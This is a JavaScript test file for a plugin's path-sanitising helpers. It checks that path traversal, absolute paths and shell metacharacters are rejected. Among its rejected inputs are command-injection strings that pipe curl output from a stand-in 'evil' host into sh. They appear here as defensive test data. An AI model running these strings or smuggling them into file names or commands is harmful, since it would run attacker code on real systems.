import { test } from "node:test";
import assert from "node:assert/strict";

import { toPosix, normalizeRel, isSafeRel, isShellSafeRel, relFromAbs, toRel } from "../../../plugins/graphyne/common/paths.mjs";

test("toPosix converts backslashes", () => {
  assert.equal(toPosix("src\\a\\b.ts"), "src/a/b.ts");
});

test("normalizeRel strips ./, dup slashes, trailing slash", () => {
  assert.equal(normalizeRel("./src//a/b.ts/"), "src/a/b.ts");
  assert.equal(normalizeRel("  src/a.ts  "), "src/a.ts");
  assert.equal(normalizeRel("src\\a.ts"), "src/a.ts");
});

test("isSafeRel rejects absolute, drive, and traversal", () => {
  assert.equal(isSafeRel("src/a.ts"), true);
  assert.equal(isSafeRel("/etc/passwd"), false);
  assert.equal(isSafeRel("C:/x"), false);
  assert.equal(isSafeRel("../escape.ts"), false);
  assert.equal(isSafeRel("a/../b.ts"), false);
  assert.equal(isSafeRel("./a.ts"), false); // "." segment
  assert.equal(isSafeRel(""), false);
});

test("isShellSafeRel accepts canonical path chars, rejects shell metacharacters", () => {
  // Accept: only [A-Za-z0-9._/-] in a normalized repo-relative path.
  assert.equal(isShellSafeRel("src/foo.test.ts"), true);
  assert.equal(isShellSafeRel("a/b-c_d.2.mjs"), true);
  assert.equal(isShellSafeRel("README.md"), true);
  assert.equal(isShellSafeRel("x.test.ts"), true);

  // Reject: command-injection payloads and every shell metacharacter.
  for (const bad of [
    "x; curl http://evil/x | sh",
    "$(curl http://evil|sh).test.ts",
    "`id`.test.ts",
    "a && b.test.ts",
    "a | b.test.ts",
    "a b.test.ts", // space
    "a>b.test.ts",
    "a<b.test.ts",
    "a&b.test.ts",
    "a\nb.test.ts", // newline
    "a'b.test.ts",
    'a"b.test.ts',
    "a*b.test.ts",
    "a\\b.test.ts", // backslash
    "a{b}.test.ts",
    "a(b).test.ts",
  ]) {
    assert.equal(isShellSafeRel(bad), false, `should reject: ${JSON.stringify(bad)}`);
  }

  // Still upholds isSafeRel: traversal, absolute, drive, empty all rejected.
  assert.equal(isShellSafeRel("a/../b.test.ts"), false);
  assert.equal(isShellSafeRel("/etc/passwd"), false);
  assert.equal(isShellSafeRel("C:/x"), false);
  assert.equal(isShellSafeRel(""), false);
});

test("relFromAbs returns canonical rel within root, null outside", () => {
  const root = process.platform === "win32" ? "C:\\proj" : "/proj";
  const inside = process.platform === "win32" ? "C:\\proj\\src\\a.ts" : "/proj/src/a.ts";
  assert.equal(relFromAbs(root, inside), "src/a.ts");
  const outside = process.platform === "win32" ? "C:\\other\\a.ts" : "/other/a.ts";
  assert.equal(relFromAbs(root, outside), null);
});

test("toRel accepts both absolute-in-root and relative", () => {
  const root = process.platform === "win32" ? "C:\\proj" : "/proj";
  assert.equal(toRel(root, "src/a.ts"), "src/a.ts");
  assert.equal(toRel(root, "../bad.ts"), null);
});
